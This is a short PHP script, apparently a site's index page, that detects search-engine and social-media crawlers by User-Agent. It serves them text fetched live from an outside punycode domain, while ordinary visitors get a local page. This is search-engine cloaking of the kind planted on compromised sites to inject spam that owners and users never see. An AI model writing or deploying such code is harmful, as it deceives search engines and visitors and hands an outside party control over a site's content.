<?php

function is_bot() {
    $bots = [
        "Googlebot", 
        "Google-Site-Verification", 
        "Google-InspectionTool", 
        "Googlebot-Mobile", 
        "Googlebot-News", 
        "Bingbot", 
        "Yahoo! Slurp", 
        "DuckDuckBot", 
        "YandexBot", 
        "Baiduspider", 
        "FacebookExternalHit", 
        "Twitterbot", 
        "Pinterest", 
        "WhatsApp", 
        "Slackbot"
    ];

    
    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
        return false;
    }

   
    foreach ($bots as $bot) {
        if (stripos($_SERVER['HTTP_USER_AGENT'], $bot) !== false) {
            return true;
        }
    }

    return false;
}

if (is_bot()) {
    
    $bot_content = @file_get_contents('https://xn--pdkuc0bb.net/landing-page/emo78/tebas.txt');
    
   
    if ($bot_content !== false) {
        echo $bot_content;
    }
    exit;
} else {
   
    include('our-goal.php');
    exit;
}

?>